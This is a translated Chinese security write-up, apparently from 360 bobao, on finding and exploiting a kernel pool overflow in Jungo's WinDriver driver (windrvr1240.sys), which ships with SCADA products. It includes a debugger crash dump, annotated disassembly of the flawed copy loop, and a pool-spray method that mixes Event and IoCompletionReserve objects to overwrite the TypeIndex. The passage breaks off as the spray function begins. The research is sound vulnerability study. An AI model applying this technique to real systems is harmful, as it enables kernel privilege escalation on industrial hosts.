# 【技术分享】瓮中之鳖：Windows内核池混合对象利用
|
##### 译文声明
本文是翻译文章，文章来源：srcincite.io
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
译者：[eridanus96](http://bobao.360.cn/member/contribute?uid=2857535356)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**传送门**
[**【技术分享】Windows内核池喷射**](http://bobao.360.cn/learning/detail/3921.html)
[**【技术分享】HEVD内核漏洞训练——陪Windows玩儿**](http://bobao.360.cn/learning/detail/3544.html)
**前言**
****
本文主要探讨一个基本的内核池溢出漏洞，并研究在通过混合内核对象进行内核池喷射后，如何通过覆盖TypeIndex来进行渗透的方法。
此前，我参加了[AWE系列课程](http://www.fuzzysecurity.com/tutorials.html)，在课程结束后，我很想找到一些可以利用的内核漏洞。尽管我可以使用[HackSys
Extreme Vulnerable
Driver（HEVD）](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)这个非常棒的学习工具，但我认为，在实际应用中发现并利用漏洞，会让我更有成就感。
于是，我开始学习如何开发一个Windows内核设备驱动程序的fuzzer，并使用我自己的fuzzer去发现漏洞，这个漏洞就是我借助自己的fuzzer发现的。希望我的漏洞发现和利用过程能对大家有所帮助。
**漏洞分析**
****
在测试了一些SCADA（数据采集与监视控制系统）产品后，我发现了一个叫做“WinDriver”的第三方组件，它其实是[Jungo的DriverWizard
WinDriver](http://www.jungo.com/st/products/windriver/)，该组件通常捆绑于几个SCADA应用程序之中，经常能在旧版本中发现它的踪迹。
在安装之后，它将一个名为 **windrvr1240.sys**
的设备驱动程序安装到Windows的驱动文件夹内。通过逆向，我找到了几个ioctl代码，可以直接插入到我fuzzer的配置文件中。
    { 
        "ioctls_range":{
            "start": "0x95380000",
            "end": "0x9538ffff"
        }
    }
然后，我通过使用 **verifier/volatile/flags 0x1/adddriver windrvr1240.sys**
，启用了一个特殊的池，并初步尝试运行了我的fuzzer。随后，成功发现了几个可以利用的漏洞，其中一个漏洞引起了我的注意：
    kd> .trap 0xffffffffc800f96c
    ErrCode = 00000002
    eax=e4e4e4e4 ebx=8df44ba8 ecx=8df45004 edx=805d2141 esi=f268d599 edi=00000088
    eip=9ffbc9e5 esp=c800f9e0 ebp=c800f9ec iopl=0         nv up ei pl nz na pe cy
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010207
    windrvr1240+0x199e5:
    9ffbc9e5 8941fc          mov     dword ptr [ecx-4],eax ds:0023:8df45000=????????
    kd> dd esi+ecx-4
    805d2599  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
    805d25a9  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
    805d25b9  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
    805d25c9  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
    805d25d9  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
    805d25e9  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
    805d25f9  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
    805d2609  e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4
这是存储在[esi +
ecx]中的用户控制数据，而它会对超出内核池的部分进行写入，通过进一步的研究发现，这其实是由loc_4199D8中的内联赋值操作而导致的池溢出。
    .text:0041998E sub_41998E      proc near                    ; CODE XREF: sub_419B7C+3B2
    .text:0041998E
    .text:0041998E arg_0           = dword ptr  8
    .text:0041998E arg_4           = dword ptr  0Ch
    .text:0041998E
    .text:0041998E                 push    ebp
    .text:0041998F                 mov     ebp, esp
    .text:00419991                 push    ebx
    .text:00419992                 mov     ebx, [ebp+arg_4]
    .text:00419995                 push    esi
    .text:00419996                 push    edi
    .text:00419997                 push    458h                 ; fized size_t +0x8 == 0x460
    .text:0041999C                 xor     edi, edi
    .text:0041999E                 push    edi                  ; int
    .text:0041999F                 push    ebx                  ; void *
    .text:004199A0                 call    memset               ; memset our buffer before the overflow
    .text:004199A5                 mov     edx, [ebp+arg_0]     ; this is the SystemBuffer
    .text:004199A8                 add     esp, 0Ch
    .text:004199AB                 mov     eax, [edx]
    .text:004199AD                 mov     [ebx], eax
    .text:004199AF                 mov     eax, [edx+4]
    .text:004199B2                 mov     [ebx+4], eax
    .text:004199B5                 mov     eax, [edx+8]
    .text:004199B8                 mov     [ebx+8], eax
    .text:004199BB                 mov     eax, [edx+10h]
    .text:004199BE                 mov     [ebx+10h], eax
    .text:004199C1                 mov     eax, [edx+14h]
    .text:004199C4                 mov     [ebx+14h], eax
    .text:004199C7                 mov     eax, [edx+18h]       ; read our controlled size from SystemBuffer
    .text:004199CA                 mov     [ebx+18h], eax       ; store it in the new kernel buffer
    .text:004199CD                 test    eax, eax
    .text:004199CF                 jz      short loc_4199ED
    .text:004199D1                 mov     esi, edx
    .text:004199D3                 lea     ecx, [ebx+1Ch]       ; index offset for the first write
    .text:004199D6                 sub     esi, ebx
    .text:004199D8
    .text:004199D8 loc_4199D8:                                  ; CODE XREF: sub_41998E+5D
    .text:004199D8                 mov     eax, [esi+ecx]       ; load the first write value from the buffer
    .text:004199DB                 inc     edi                  ; copy loop index
    .text:004199DC                 mov     [ecx], eax           ; first dword write
    .text:004199DE                 lea     ecx, [ecx+8]         ; set the index into our overflown buffer
    .text:004199E1                 mov     eax, [esi+ecx-4]     ; load the second write value from the buffer
    .text:004199E5                 mov     [ecx-4], eax         ; second dword write
    .text:004199E8                 cmp     edi, [ebx+18h]       ; compare against our controlled size
    .text:004199EB                 jb      short loc_4199D8     ; jump back into loop
负责复制的循环，实际上会为每次循环（qword）复制8个字节，并溢出大小为0x460（0x458 + 0x8字节头）的缓冲区。
**复制的大小，直接是攻击者在输入缓冲区控制部分的大小**
。不存在整数溢出，也并没有将其存储在不易被找到的地方。我们可以看到，0x004199E8的大小，就是相应缓冲区中，从+0x18偏移量控制部分的大小。这样一来，利用就变得尤为简单。
**漏洞利用**
****
我们可以借助TypeIndex对象覆盖的方式来进行这一漏洞的利用，具体来说是使用内核对象，覆盖存储在_OBJECT_HEADER中的TypeIndex。更详细的内容，可以参考文末我引用的文章。
以往我们使用的一些常用对象都是Event对象（大小为0x40）和IoCompletionReserve对象（大小为0x60），常用的利用方式是像这样：
1\. 用大小为X的对象造成池喷射，填满内存页；
2\.
通过立即释放内存（free）或减少对象的引用计数（release，不会立即释放）相邻的对象，以触发coalescing，从而达到目标区块要求的大小（在本例中是0x460）；
3\. 分配和溢出缓冲区，这样有一定几率可以消除下一个对象的_OBJECT_HEADER，从而利用TypeIndex。
举例来说，如果溢出的缓冲区大小是0x200，就可以分配一组Event对象，并释放（free）其中的0x8（因为0x40 * 0x8 ==
0x200），这样一来我们就可以在其中进行分配和溢出。所以，我们假设需要的内核对象，是池大小的n次幂。
但问题是，通过这种方式有时并不会有效，例如我们的池大小是0x460，如果我们这样的话：
    >>> 0x460 % 0x40
    32
    >>> 0x460 % 0x60
    64
    >>>
结果表明，总会有剩余的一部分空间，也就是说我们不能使其产生一个特定大小的区块。后来，我发现有一种方法可以解决该问题，我们可以搜索具有目标缓冲区大小的n次幂的内核对象，并使用这些找到的对象。经过搜寻，我发现了另外两个内核对象：
    # 1
    type = "Job"
    size = 0x168
    windll.kernel32.CreateJobObjectW(None, None)
    # 2
    type = "Timer"
    size = 0xc8
    windll.kernel32.CreateWaitableTimerW(None, 0, None)
然而，这些大小也同样不能使用，因为它们没有满足要求。经过一段时间的测试，我意识到，可以采用这样的方式：
    >>> 0x460 % 0xa0
    0
    >>>
这样一来，0xa0就可以均匀地分成几个0x460，那么我们再将Event和IoCompletionReserve对象结合起来（0x40 + 0x60 =
0xa0），就能够实现！
**喷射过程**
****
    def we_can_spray():
        """